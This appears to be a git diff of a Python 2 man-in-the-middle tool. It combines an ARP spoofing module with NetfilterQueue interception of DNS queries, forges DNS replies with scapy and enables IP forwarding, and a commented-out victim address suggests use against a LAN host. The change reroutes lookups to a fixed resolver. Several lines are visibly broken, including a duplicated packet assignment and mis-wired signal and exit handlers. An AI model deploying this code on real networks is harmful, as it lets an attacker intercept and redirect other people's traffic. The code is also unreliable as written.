@@ -3,15 +3,16 @@ import os
 import re
 import signal
 
+from scapy.all import *
+from scapy.layers.dns import DNSQR, DNS, DNSRR
+from scapy.layers.inet import IP, UDP
+
 from cleaner import cleaner
 
 from arpspoof import ARP
 from multiprocessing import Process
 
 from netfilterqueue import NetfilterQueue
-
-from scapy.layers.dns import DNSQR, DNS, DNSRR
-from scapy.layers.inet import IP, UDP
 
 import atexit
 
@@ -58,16 +59,11 @@ def normal_callback(data):
         host = pkt[DNS].qd.qname
         print "Detect DNS query %s" % host
 
-        output = os.popen('nslookup %s' % host).read()
+        res = sr1(IP(dst="168.126.63.1") / UDP() / DNS(rd=1, qd=DNSQR(qname=host)))
 
-        ip = None
-        for address in re.findall(r"[0-9]+(?:\.[0-9]+){3}", output):
-            if '127' in address:
-                continue
-            else:
-                ip = address
-
-        assert ip is not None
+        normal_pkt = \
+            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / res[DNS]
 
         normal_pkt = \
             IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -76,14 +72,11 @@ def normal_callback(data):
                 id=pkt[DNS].id,
                 qr=1,
                 aa=1,
-                qd=pkt[DNS].qd,
-                an=DNSRR(
-                    rrname=host,
-                    ttl=1234,
-                    rdata=ip
-                )
+                qd=res[DNS].qd,
+                an=res[DNS].an
             )
-        print "%s is %s!" % (host, ip)
+
+        print "%s is resolved!" % host
         data.set_payload(str(normal_pkt))
         data.accept()
 
@@ -93,9 +86,9 @@ def run_arp(victim_ip):
     arp.run()
 
 
-def exit_handler(queue, process):
+def exit_handler(queue):
     queue.unbind()
-    process.join()  # Escape ARP loop
+    # process.join()  # Escape ARP loop
     cleaner()
     print("Successfully")
 
@@ -110,9 +103,9 @@ def main():
     else:
         q.bind(1, normal_callback)
 
-    #victim_ip = '192.168.0.39'
+    # victim_ip = '192.168.0.39'
 
-    #arp_process = Process(target=run_arp, args=(victim_ip,))
+    # arp_process = Process(target=run_arp, args=(victim_ip,))
 
     try:
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
@@ -121,7 +114,7 @@ def main():
     except KeyboardInterrupt:
         # exit_handler(q, arp_process)
         pass
-    # signal.signal(signal.SIGTERM, exit_handler(q, arp_process))
+    signal.signal(signal.SIGTERM, exit_handler(q))
     atexit.register(exit_handler)
 
 
